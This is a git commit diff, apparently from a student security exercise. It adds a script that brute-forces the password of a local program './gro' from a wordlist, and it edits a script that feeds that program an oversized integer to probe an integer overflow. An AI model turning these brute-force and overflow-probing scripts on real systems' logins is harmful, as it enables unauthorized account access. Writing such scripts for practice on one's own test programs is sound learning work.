fe7036285490c75da6f2965bafc0874ef1724886
Vihar Devalla <vihardevalla@gmail.com>
2021-04-18 20:23:57 +0530

    Final Changes

--- exp.py
+++ exp.py
@@ -1,4 +1,21 @@
 import subprocess
-process = subprocess.Popen(['grocery.exe'],stdout=subprocess.PIPE,stdin=subprocess.PIPE,shell=True,text=True)
-print(process)
-print(process.communicate(input='1 2 admin\nadmin')[0])
+
+wordlist_file = "wordlist.txt"
+
+# Open the file as f.
+# The function readlines() reads the file.
+with open(wordlist_file) as f:
+    content = f.readlines()
+    wordlist = [word.strip('\n') for word in content]
+    for payload in wordlist:
+    	print('Trying password :',payload)
+    	process = subprocess.Popen('./gro',stdout=subprocess.PIPE,stdin=subprocess.PIPE)
+    	input_val = '1\n2\n{}'.format(payload)
+    	#print(input_val)
+    	output = process.communicate(input=input_val)[0]
+    	#print(output)
+    	all_msg = output.split('\n')
+    	#print(all_msg)
+    	if(all_msg[-3] != 'Wrong Password '):
+			print("Login Successful , password is {}".format(payload))
+			break
--- integer_vuln.py
+++ integer_vuln.py
@@ -2,7 +2,7 @@ import subprocess
 
 process = subprocess.Popen('./gro',stdout=subprocess.PIPE,stdin=subprocess.PIPE)
 
-input_val = '1 1 hi\nhi123\n4\n{}'.format(pow(2,25)-1) 
+input_val = '1\n1\nhi\nhi123\n4\n{}'.format(pow(2,25)-1) 
 print(input_val)
 output = process.communicate(input=input_val)[0]
 print(output)
